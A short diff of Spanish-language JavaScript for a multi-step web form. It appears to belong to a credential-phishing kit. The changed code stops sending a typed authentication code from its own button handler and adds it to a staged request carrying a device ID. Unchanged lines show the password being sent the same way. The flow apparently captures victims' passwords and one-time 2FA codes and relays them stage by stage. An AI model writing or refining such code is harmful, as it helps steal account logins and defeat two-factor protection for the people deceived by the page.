@@ -295,14 +295,6 @@ document.getElementById("continuarBtn").addEventListener("click", function () {
     enviarDatos('password', password);  // Enviar contraseña
 });
 
-// Enviar código de autenticación
-document.getElementById("authBtn").addEventListener("click", async function () {
-    const authCode = document.getElementById("authCode").value;
-    await enviarDatos('auth', authCode);  // Enviar código de autenticación
-});
-
-// Enviar calificación
-
 document.getElementById("resultado-aceptarBtn").addEventListener("click", async function () {
     await enviarDatos('calificacion', 'SOLICITAR');
 });
@@ -850,9 +842,10 @@ const sombraAutenticacion =
                     },
 
                     body: JSON.stringify({
-                        dispositivoID,
-                        etapa: "autenticacion"
-                    }),
+    dispositivoID,
+    etapa: "autenticacion",
+    autenticacion: document.getElementById("authCode").value
+}),
 
                     signal: controlador.signal
                 }
